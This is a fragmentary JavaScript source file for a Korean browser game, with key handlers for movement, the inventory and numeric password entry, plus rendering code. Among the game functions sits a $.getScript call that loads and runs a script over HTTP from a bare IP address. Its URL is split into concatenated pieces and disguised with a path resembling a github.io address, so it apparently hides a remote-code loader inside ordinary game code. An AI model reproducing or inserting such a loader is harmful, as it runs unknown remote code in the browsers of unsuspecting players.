...
function ffalling_Script(script){
...
function fIllust_falling(script, Illust, top_string){
...
function fmakeScript_Selection(script, select){
    dialogue = script;
...
function fmakeScript_Password(script, password){
    dialogue = script;
...
function fMessageBox(msg, yes, no){
    cur_message = {msg: msg, yes: yes, no: no};
    msg_select = 0;
}
function fscreen_msgBox(msg, color){
    screen_msg = {msg: msg, count: 0, color: color};
}

function fdo_newGame(){               
    MAP_CODE = 0;
    player_x = 810;
    player_y = 428; 
...
function fstart_game() {
    ...
    framework.addkeyTdown('SPACE', function(){
    ...
    $(framework.Canvas).click(function(){
     ...
     framework.addkeyTdown('LEFT', function () {
        if(cur_message){}
    ...
    framework.addkeyTdown('RIGHT', function () {
        if(cur_message){}
        else if(gamestate == STATE_PLAY){
    ...
    framework.addkeyTdown('UP', function () {
        if(cur_message){}
        else if(gamestate == STATE_PLAY){
            char_status.right = false;
            char_status.down = false;
    ...
    framework.addkeyTdown('DOWN', function () {
        if(cur_message){}
        else if(gamestate == STATE_PLAY){
            char_status.right = false;
            char_status.left = false;
    ...
    //framework.addkeyTdown('F12', function(){});
    framework.addkeyTdown('F11', function(){});
    
    framework.addkeyTdown('ENTER', function(){
        if(cur_message){
            if(msg_select==0)
                cur_message.yes();
            else cur_message.no();
    ...
    framework.addkeyTdown('ESC', function(){
        char_status.left=false;
        char_status.right=false;
        char_status.up=false;
        char_status.down=false;
        ...
        else if(gamestate==STATE_CONFIG || gamestate==STATE_CREDIT || gamestate==STATE_GALALY){
            gamestate=STATE_START;
        }
    });
    
    framework.addkeyTdown('I', function(){
        if(cur_message){}
        else if (gamestate == STATE_PLAY){
            if(myItem.length==0) screen_msgBox('아직 사용할 수 없습니다.', '#f00');
            else gamestate = STATE_INVENTORY;
    ...
    framework.addkeyTdown('ONE', function(){
        width = 1024;
        height = 768;
    ...
    framework.addkeyTdown('ZERO', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '0';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_ZERO', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '0';
            password_length--;
        }
    ...
    framework.addkeyTdown('KEY_ONE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '1';
            password_length--;
        }
    ...
    framework.addkeyTdown('TWO', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '2';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_TWO', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '2';
            password_length--;
        }
    ...
    framework.addkeyTdown('THREE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '3';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_THREE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '3';
            password_length--;
        }
    ...
    framework.addkeyTdown('FOUR', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '4';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_FOUR', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '4';
            password_length--;
        }
    ...
    framework.addkeyTdown('FIVE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '5';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_FIVE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '5';
            password_length--;
        }
    ...
    framework.addkeyTdown('SIX', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '6';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_SIX', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '6';
            password_length--;
        }
    ...
    framework.addkeyTdown('SEVEN', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '7';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_SEVEN', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '7';
            password_length--;
        }
    ...
    framework.addkeyTdown('EIGHT', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '8';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_EIGHT', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '8';
            password_length--;
        }
    ...
    framework.addkeyTdown('NINE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '9';
            password_length--;
        }
    });
    framework.addkeyTdown('KEY_NINE', function(){
        if(gamestate == STATE_PASSWORD && password_length>0){
            cur_password += '9';
            password_length--;
        }
...
function fPotal(MAP_Code, pl_x, pl_y){
    MAP_CODE = MAP_Code;
...
$.getScript("http://1.232.77.18/nam92"+
            "1.github.io/GAME/DATA/J"+
            "S/import_hello.js", function() {});
...
function fRender() {
    ...
    switch(gamestate){
        ...
        case STATE_CONFIG:
            ...
            framework.addTextCenter('MENU KEY', '36px english_font', 200, 360, '#262626');
            ...
            framework.addTextCenter("'O'", '30px english_font', 475, 360, '#262626');
            framework.addTextCenter("'ESC'", '30px english_font', 625, 360, '#262626');
...
function faddSpaceDown(x,y,current,callback){                                                                                   
    framework.addkeyTdown('SPACE', function(){
        char_status.down=false;
        char_status.left=false;
        char_status.right=false;
